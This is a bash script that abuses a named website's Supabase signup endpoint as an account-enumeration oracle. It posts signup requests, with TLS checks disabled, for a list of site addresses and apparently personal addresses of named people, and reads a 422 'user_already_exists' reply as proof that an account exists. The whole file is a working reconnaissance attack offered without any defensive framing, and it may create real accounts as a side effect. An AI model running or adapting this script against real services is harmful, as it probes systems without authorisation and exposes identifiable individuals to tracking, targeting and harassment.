#!/bin/bash
# Supabase signup oracle: 422 user_already_exists => email registered. Cheap, no login limiter.
set -u
KEY="<publishable-key>"
SUP="https://cdn.onlyfakeai.ru/auth/v1/signup"
UA="Mozilla/5.0"
EMAILS=(
  "admin@onlyfakeai.ru"
  "support@onlyfakeai.ru"
  "contact@onlyfakeai.ru"
  "ops@onlyfakeai.ru"
  "onlyfake@onlyfakeai.ru"
  "admin@<remote-account>.com"
  "onlyfake@onlyfakeai.ru"
  "onlyfake@gmail.com"
  "onlyfake@protonmail.com"
  "uriel@tuta.io"
  "nazarenko@tuta.io"
)
for e in "${EMAILS[@]}"; do
  body=$(curl -sS -k -m 20 -A "$UA" -H "apikey: $KEY" -H 'Content-Type: application/json' \
    -d "{\"email\":\"$e\",\"password\":\"Probe$(date +%s)!\",\"data\":{}}" \
    -w '\n%{http_code}' "$SUP")
  code=$(echo "$body" | tail -1)
  msg=$(echo "$body" | head -n -1 | head -c 160)
  echo "[$code] $e :: $msg"
  sleep 1
done
